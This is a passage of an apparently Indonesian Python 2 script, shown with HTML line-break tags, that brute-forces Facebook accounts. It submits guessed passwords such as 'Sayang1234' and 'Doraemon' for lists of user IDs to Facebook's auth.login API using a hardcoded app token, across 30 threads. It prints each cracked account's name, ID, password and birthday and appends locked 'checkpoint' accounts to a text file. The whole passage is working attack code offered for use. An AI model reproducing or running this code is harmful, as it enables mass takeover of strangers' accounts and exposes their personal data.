json.load(data)<br/>																	if 'access_token' in w:<br/>																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>																		z = json.loads(x.text)<br/>																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>																		print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'<br/>																		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																		oks.append(user+pass8)<br/>																	else:<br/>																		if 'www.facebook.com' in w['error_msg']:<br/>																			print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>																			print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'<br/>																			print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																			cek = open("out/super_cp.txt", "a")<br/>																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")<br/>																			cek.close()<br/>																			cekpoint.append(user+pass8)<br/>																		else:<br/>																				pass9 = 'Sayang1234'<br/>																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>																				w = json.load(data)<br/>																				if 'access_token' in w:<br/>																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>																					z = json.loads(x.text)<br/>																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>																					print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'<br/>																					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																					oks.append(user+pass9)<br/>																				else:<br/>																					if 'www.facebook.com' in w['error_msg']:<br/>																						print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>																						print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'<br/>																						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																						cek = open("out/super_cp.txt", "a")<br/>																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")<br/>																						cek.close()<br/>																						cekpoint.append(user+pass9)<br/>																					else:<br/>																						pass10 = 'Bangsat'<br/>																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>																						w = json.load(data)<br/>																						if 'access_token' in w:<br/>																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>																							z = json.loads(x.text)<br/>																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>																							print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'<br/>																							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																							oks.append(user+pass10)<br/>																						else:<br/>																							if 'www.facebook.com' in w['error_msg']:<br/>																								print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>																								print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'<br/>																								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																								cek = open("out/super_cp.txt", "a")<br/>																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")<br/>																								cek.close()<br/>																								cekpoint.append(user+pass10)<br/>																							else:<br/>																								pass11 = 'Doraemon'<br/>																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>																								w = json.load(data)<br/>																								if 'access_token' in w:<br/>																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>																									z = json.loads(x.text)<br/>																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>																									print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'<br/>																									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																									oks.append(user+pass11)<br/>																								else:<br/>																									if 'www.facebook.com' in w['error_msg']:<br/>																										print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>																										print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'<br/>																										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																										cek = open("out/super_cp.txt", "a")<br/>																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")<br/>																										cek.close()<br/>																										cekpoint.append(user+pass11)<br/>		except:<br/>			pass<br/>			<br/>	p = ThreadPool(30)<br/>	p.map(main, id)<br/>	print "\033[1;34m████████████████████████████████████████████████"<br/>	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mSelesai ....'<br/>	print"\033[1;97m[\033[1;93m✴\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))<br/>	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'<br/>	print "\033[1;34m████████████████████████████████████████████████"<br/>	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")<br/>	os.system("python2 Testing.py")<br/>	<div></div>	<br/>			<br/>if __name__=='__main__':<br/>        menu()<br/>        masuk()